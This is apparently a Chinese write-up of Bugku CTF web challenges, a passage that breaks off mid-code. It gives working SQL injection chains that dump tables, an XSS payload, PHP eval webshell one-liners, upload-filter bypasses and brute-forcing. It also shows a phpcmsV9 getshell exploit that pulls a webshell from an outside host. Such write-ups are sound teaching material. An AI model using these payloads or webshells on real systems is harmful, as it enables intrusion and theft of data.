    <content type="html"><![CDATA[<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>view-source:查看源码即可<br><a id="more"></a></p><h2 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h2><p>上传一个PHP文件发现他要的是图片文件，抓包先改一下content-type为image/jpeg，Go一下发现flag<br><img src="http://img.blog.csdn.net/2018021421271251?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12调出开发者工具，把maxlength改为更长的长度即可</p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>完全就是考php基础，直接URL加上index.php?what=flag即可</p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>用Hackbar post数据即可</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>利用了==的弱类型，然后令num=1e，get上去即可绕过</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>停止之后，查看源码，最后发现了Html的编码，直接python跑一下即可</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>查看源码发现是宽字节的注入<br><img src="http://img.blog.csdn.net/20180214212730949?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>从报错可以猜测语句是select * from ** where id=’input’<br>注意key的双引号<br>payload:<code>?id=-1%df&#39;union select string,2 from `key` where id=1 --+</code></p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>代码里面是数字型的注入<br>查看代码里面的strip_tags函数是返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果，可以利用这个特性去过滤<br><img src="http://img.blog.csdn.net/20180214212918175?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om `key` where id=1--+</span><br></pre></td></tr></table></figure><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>抓包go几下即可。。。<br><img src="http://img.blog.csdn.net/20180214212941106?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>读一下代码eval函数是执行代码的，而var_dump函数是把所有变量的属性给显示出来的，flag在flag.php里面那么我们就构造file函数传参给hello<br>payload：<code>http://120.24.86.145:8003/?hello=file(%27flag.php%27)</code><br>这题还有其他方法<br>比如:<br><code>http://120.24.86.145:8003/?hello=$GLOBALS</code>     利用了全局变量<br><code>http://120.24.86.145:8003/?hello=);show_source(%27flag.php%27);//</code>    利用了eval执行函数去闭合var_dump函数</p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>这里有个正则表达式，没啥影响，发现出现了$$的变量，直接用全局变量$GLOBALS即可，payload:?args=GLOBALS,进而构造出var_dump($GLOBALS)<br><img src="http://img.blog.csdn.net/20180214213030248?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码发现有url编码，解码后观察代码，发现password为67d709b2b54aa2aa648cf6e87a7114f1,提交之后得到key</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>查看源码发现里面有JSfuck，解码一下，得到flag,记的提交的时候全大写。。。。</p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>进去之后点击，发现url上面有file参数，就想到了php里面的file协议，用base64转码把index.php里面的内容读出来，再解码，得到flag</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>5位数，用python写个字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f=open(&apos;5位数.txt&apos;,&apos;w&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(10000,100000):</span><br><span class="line">print i</span><br><span class="line">f.write(str(i))</span><br><span class="line">f.write(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>直接用bp暴力破解,密码是13579<br><img src="http://img.blog.csdn.net/20180214213232874?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="点击一万次"><a href="#点击一万次" class="headerlink" title="点击一万次"></a>点击一万次</h2><p>右击审查元素,发现只要clicks参数大于1000000才会出现flag，在控制台里面输入clicks&gt;1000000的数字即可，记得最后还要点一下才出现flag<br><img src="http://img.blog.csdn.net/20180214213105995?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><p>查看网页源代码发现里面有一个code.txt打开一看原来是代码审计问题<br>利用了==弱类型以及strcmp()函数，它无法处理处理数组<br>这里有两个MD5后可以弱类型截断的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><p>关键payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=s878926199a&amp;v3[]=1</span><br></pre></td></tr></table></figure><h2 id="成绩查询"><a href="#成绩查询" class="headerlink" title="成绩查询"></a>成绩查询</h2><p>一个简单的SQL注入题没有过滤，输入单引号不回显，再加一个注释回显，便猜测SQL语句应该是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from **** where id=&apos;&apos;;</span><br></pre></td></tr></table></figure><p>用hackbar去post数据<br>先二分法看有几列 id=1’ order by 4##<br>验证四列到底怎么显示  <code>id=-1&#39; union select 1,2,3,4 ##</code>  这里id=-1，是为了让前面的语句为空，让后面的语句回显<br>爆库  <code>id=-1&#39; union select 1,2,3,database() ##</code>   就一个数据库<br>爆表   <code>id=-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#39;skctf_flag&#39;##</code> 两个表分别是    fl4g,sc<br>肯定是fl4g表，接下来爆字段 <code>id=-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; ##</code><br>爆内容 <code>id=-1&#39; union select 1,2,3,skctf_flag from `fl4g` ##</code></p><h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>还是利用了sha1不能处理数组的特性。。。。。。<br>下面是payload<br><img src="http://img.blog.csdn.net/20180215230405533?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>目录下发现robots.txt，里面有一个目录<br><img src="http://img.blog.csdn.net/20180215230427926?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>于是就到另外一个目录看一下，发现下面有行字，<br><img src="http://img.blog.csdn.net/20180215230438970?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>又想到提示里面的管理员，猜测密码可能是admin或者是administrator，尝试第一个的时候就对了<br><img src="http://img.blog.csdn.net/2018021523045778?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>先来最简单的弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;srcipt&gt;altert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>查看源码<br><img src="http://img.blog.csdn.net/20180220161815744?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>发现&lt;&gt;被过滤掉了<br>这里学到一个技巧，就是用Unicode编码绕过<br>payload:<code>?id=\u003cimg src=1 onerror=alert(_key_)\u003e</code></p><h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>这种题就是编程题<br>上脚本，注意这题是用margin。。。。查看源码可知<br><img src="http://img.blog.csdn.net/20180220161903907?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url =&apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line"></span><br><span class="line">r =requests.session()</span><br><span class="line"></span><br><span class="line">headers = r.get(url).headers</span><br><span class="line">##flag = head[&apos;Flag&apos;].split(&apos;:&apos;)[0]   注意response的键</span><br><span class="line">##print flag</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(base64.b64decode(headers[&apos;flag&apos;]).split(&apos;:&apos;)[1])</span><br><span class="line">data=&#123;&apos;margin&apos;:flag&#125;</span><br><span class="line">print r.post(url=url,data=data).content ##.text</span><br></pre></td></tr></table></figure><h2 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h2><p>进去一看是条代码审计题目<br><img src="http://img.blog.csdn.net/20180220162209182?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>这里加上别人跟自己对于正则的常规总结</p><pre><code>1.表达式直接写出来的字符串直接利用，如key2.“.”代表任意字符3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以&apos;^&apos;开头，以&apos;$&apos;结束4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束5.[a-z]代表a-z中的任意一个字符6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号7./i代表大小写不敏感8.{4-7}代表[0-9]中数字连续出现的次数是4-7次9.\s匹配任意的空白符10.\d    匹配数字11.\b    匹配单词的开始或结束</code></pre><p>自己的payload:<code>?id=keyakey1111key:/a/akeya@</code></p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>这个题目又学到了新知识<br>利用了file_get_contents的特性，当用到php://input的时候，file_get_contents支持字节流输入，只要构造php://input,且post数据过去即可<br>payload:?ac=1&amp;php://input然后再post一个 1即可</p><h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>这一道题目又学到新知识。。。。<br>用PHP别名来绕过。。。php2, php3, php4, php5, phps, pht, phtm, phtml<br>然后参考了大佬们的wp<br>发现这一题还要把Content-Type: multipart/form-data; 改成大小写绕过的形式，改为Content-Type: Multipart/form-data;<br>然后用别名去尝试php5的时候出现flag<br><img src="http://img.blog.csdn.net/20180220162259228?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码，发现有一个1p.html<br>打开一看里面有js代码，直接放到控制台里面看一下<br>发现跳转到论坛，然后不知道要干嘛。。。。。<br>还是先转义一下那段东西吧，先urldecode，再发现里面有base64，然后再一次urldecode发现一段代码<br><img src="http://img.blog.csdn.net/2018022016235961?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20180220162628945?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>发现有一个txt文件，不管那么多，先访问一下<br>得到flag</p><h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>这个一句话是get方式发送数据<br>先了解一些函数<br>phpinfo()函数查看信息<br>看看根目录下有哪些文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(&quot;./&quot;))</span><br><span class="line">print_r(glob(&quot;*&quot;))</span><br></pre></td></tr></table></figure><p>发现有一个flag.txt，直接访问即可，也可以用下面的函数打印出来<br>一些常用的输出文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(file(&apos;flag.txt&apos;)),这里的print_r换成var_dump也行</span><br><span class="line">show_source(&quot;flag.txt&quot;)</span><br></pre></td></tr></table></figure><p><img src="http://img.blog.csdn.net/20180220162438669?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h2><h2 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h2><p>这是我第一次尝试这样的漏洞。。。。。<br>先百度一下，发现phpcmsV9存在前台注册页面存在getshell漏洞，<br><img src="http://img.blog.csdn.net/2018021523051926?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>先用bp抓包，<br><img src="http://img.blog.csdn.net/20180215230612567?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>在最下面的post数据里面加上<code>&amp;info[content]=&lt;img src=http://www.bugku.com/tools/phpyijuhua.txt?.php##.jpg&gt;</code></p><p>这里面的链接是Bugku论坛里面的现成的小马，当然你也可以自己写一个。。。。。。<br><img src="http://img.blog.csdn.net/20180215230556648?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>然后复制go之后返回数据包里面的链接，也就是右边的箭头，用菜刀链接。。。说起这个菜刀这工具，这是我第一次真正用它实操，以前我都是看视频看别人用的。。。￣□￣｜｜<br><img src="http://img.blog.csdn.net/20180215230655594?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>连接之后在根目录下找到flag的图片，放进HXD里面就能找到flag了。。。。</p><p>啊，还有一种方法是直接用bugku论坛里面的getshell工具，自动出来shell地址，然后菜刀链接那个地址即可<br><img src="http://img.blog.csdn.net/20180215230727560?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>说起来我还是喜欢上面的方法，复现一下也蛮好的。。。。。。。。</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>因为题目提示hint，于是就输入?hint<br><img src="http://img.blog.csdn.net/20180227234421915?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>原来是代码审计题目<br>考了一个反序列化的知识点<br>构造payload,但是注意代码中if-else的范围，倒数第二行中确实为变量KEY赋值了，但是它是在另一个else里<br>在进行严格比较前，变量KEY的值并没有被赋值<br>所以KEY为空值<br>然后在bp上构建payload<br><img src="http://img.blog.csdn.net/20180227234436932?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开一看一串东西，题目不是说是备份是个好东西吗。。备份的话就会想到源码泄露之类的东西，这里介绍一个好用的东西<br><a href="coding.net/u/yihangwang/p/SourceLeakHacker/git">SourceLeakHacker</a><br>上去一扫，发现文件<br><img src="http://img.blog.csdn.net/20180227234524805?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20180227234549777?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>两种payload:<br>第一种是利用MD5函数返回false的，第二种是弱类型，MD5之后是0e开头的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?kkeyey1[]=1&amp;kkeyey2[]=2</span><br><span class="line">?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="秋名山老司机"><a href="#秋名山老司机" class="headerlink" title="秋名山老司机"></a>秋名山老司机</h2><p>脚本题。。。。这是某位大佬的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(&quot;http://120.24.86.145:8002/qiumingshan/&quot;)</span><br><span class="line">searchObj = re.search(r&apos;^&lt;div&gt;(.*)=\?;&lt;/div&gt;$&apos;, r.text, re.M | re.S)</span><br><span class="line">d = &#123;</span><br><span class="line">    &quot;value&quot;: eval(searchObj.group(1))</span><br><span class="line">&#125;</span><br><span class="line">r = s.post(&quot;http://120.24.86.145:8002/qiumingshan/&quot;, data=d)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>找来找去页面就发现这种东西<br><img src="http://img.blog.csdn.net/20180227234728779?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>然后扫描以下网站<br>发现以下几个网站<br><img src="http://img.blog.csdn.net/2018022723473841?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>其中最有利用价值的是phpmyadmin，用刚才的那个wp那个东西登录即可。。<br><img src="http://img.blog.csdn.net/20180227234753828?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>这题真是太坑。。。。哪有什么注入。。。<br>我是看到别人wp说直接扫目录即可。。。<br>找到一个叫flag的东西下载下来，真的气死</p><h2 id="这是一个神奇的登录界面"><a href="#这是一个神奇的登录界面" class="headerlink" title="这是一个神奇的登录界面"></a>这是一个神奇的登录界面</h2><p>简单的post注入，什么过滤都没有。。。<br>先尝试” 报错，然后构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select order by 2##&amp;admin_passwd=&amp;submit=GO GO GO</span><br><span class="line">admin_name=-1&quot; union select 1,2##&amp;admin_passwd=&amp;submit=GO GO GO     确定回显</span><br><span class="line">admin_name=-1&quot; union select database(),2##&amp;admin_passwd=&amp;submit=GO GO GO</span><br><span class="line">admin_name=-1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=daTABASE()##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure></p><p><img src="http://img.blog.csdn.net/20180227235201848?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;flag1&apos;##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure></p><p><img src="http://img.blog.csdn.net/2018022723521062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=-1&quot; union select flag1,2 from `flag1`##&amp;admin_passwd=&amp;submit=GO GO GO</span><br></pre></td></tr></table></figure><p><img src="http://img.blog.csdn.net/20180227235218849?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="文件包含二"><a href="#文件包含二" class="headerlink" title="文件包含二"></a>文件包含二</h2><p>两种绕过方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就是upload.php中是不能以php运行的</p><h2 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h2><p>参考下面这一篇文章<br><a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a><br>既可以很快构造payload了<br>随便一个用户名加上一个超过它数据库规定的长度即可</p><h2 id="welcome-to-bugku"><a href="#welcome-to-bugku" class="headerlink" title="welcome to bugku"></a>welcome to bugku</h2><p>抓包发现源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>出现file_get_contents，绕过第一层，然后用伪协议读取文件<br><img src="http://img.blog.csdn.net/20180309221929409?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>得到base64编码然后解码得到下面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     &lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>感觉还是少了点东西，再用同样的方法查看index.php<br>这一下就感觉比较全了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the 